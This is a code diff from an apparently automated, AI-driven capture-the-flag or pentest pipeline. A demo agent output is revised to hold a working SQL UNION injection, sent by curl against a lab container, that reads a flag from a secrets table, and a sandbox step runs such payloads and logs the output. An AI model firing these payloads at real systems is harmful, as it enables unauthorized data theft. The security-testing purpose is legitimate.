@@ -100,9 +100,9 @@ _DEMO_SCOUT = """{
 }"""
 
 _DEMO_INVESTIGATOR = """{
-  "hypothesis": "The /search endpoint concatenates user input directly into a SQL query. A UNION injection can pivot to the secrets table.",
-  "exploit_payload": "curl -s 'http://chimera-victim-1:5000/search?q=%27+UNION+SELECT+flag%2C2%2C3+FROM+secrets--'",
-  "reasoning_steps": ["Identify vulnerable endpoint", "Craft UNION payload", "URL-encode for curl"],
+  "hypothesis": "The /search endpoint concatenates user input directly into a SQL query. A UNION injection can pivot to the secrets table using the correct 4-column schema.",
+  "exploit_payload": "curl -s 'http://chimera-victim-1:5000/search?q=%27+UNION+SELECT+1%2Cvalue%2C3%2C4+FROM+secrets+WHERE+key%3D%27flag%27--'",
+  "reasoning_steps": ["Identify vulnerable endpoint", "Determine products table has 4 columns", "Use key/value column names from secrets table", "URL-encode for curl"],
   "confidence_score": 0.95
 }"""
 
@@ -341,10 +341,12 @@ async def sandbox_node(state: GraphState) -> GraphState:
         return result
 
     exec_result = await asyncio.to_thread(execute_bash_sandboxed, payload)
-    output = exec_result.get("stdout", "")
+    output = exec_result.get("stdout", "") or exec_result.get("stderr", "")
+    log.info("sandbox_output", trace_id=state["trace_id"], output_preview=output[:300])
     match = _FLAG_PATTERN.search(output)
     flag = match.group(0) if match else ""
-    result = {**state, "captured_flag": flag, "failure_reason": "Flag not found" if not flag else "",
+    failure_reason = f"Flag not found. Command output: {output[:500]}" if not flag else ""
+    result = {**state, "captured_flag": flag, "failure_reason": failure_reason,
             "status": "evaluating", "iteration_count": state["iteration_count"]+1}
     trace_node_exit(state["trace_id"], "sandbox", dict(result), start)
     return result
